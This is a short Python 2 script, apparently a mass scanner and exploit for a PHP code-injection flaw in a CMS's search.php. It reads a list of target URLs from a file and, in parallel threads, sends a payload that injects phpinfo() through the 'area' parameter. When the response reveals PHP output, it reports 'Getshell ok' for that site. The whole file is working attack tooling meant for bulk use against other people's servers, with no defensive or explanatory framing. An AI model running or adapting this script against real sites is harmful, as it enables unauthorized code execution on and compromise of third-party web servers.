#coding:utf-8

import requests
import threading

def getshell(url):
        if url[-1] != '/': url += '/'
        payload = 'search.php?searchtype=5&tid=&area=phpinfo()'
        u = url + payload
        headers = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36'}
        req = requests.get(u,headers=headers)
        if 'PHP Version' in str(req.content):#DOCUMENT_ROOT
            print '[*] ' + url + ' Getshell ok.'
        else:
            pass

def main():
        tsk = []
        file=open('tar.txt','r')
        for i in file.readlines():
            url = i.strip('\n')
            t = threading.Thread(target = getshell,args = (url,))
            tsk.append(t)
        for t in tsk:
            t.start()
            t.join(0.1)

if __name__ == '__main__':
        main()